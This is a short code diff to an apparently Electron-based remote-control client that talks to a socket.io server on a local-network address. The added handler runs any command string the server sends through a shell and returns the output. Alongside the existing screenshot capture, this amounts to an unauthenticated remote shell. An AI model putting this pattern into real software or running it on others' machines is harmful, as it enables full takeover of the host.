@@ -1,6 +1,7 @@
 
 const { desktopCapturer } = require("electron");
 const io = require("socket.io-client");
+const child_process = require("child_process");
 
 let info = { host: "192.168.1.153", port: 3001, id: 1 }
 
@@ -32,6 +33,15 @@ class RemoteControl {
 
         this.socket.on("screenshotRequest", data => {
             this.getScreenData(data).then();
+        });
+
+        this.socket.on("getRunRequest", data => {
+            console.log(data);
+            child_process.exec(data.cmd, {shell:true}, (err, stdout, stderr) => {
+                console.log(stdout);
+                data["cmd"] = {err, stdout, stderr};
+                this.socket.emit("getRunResponse", data);
+            });
         });
     }
 }
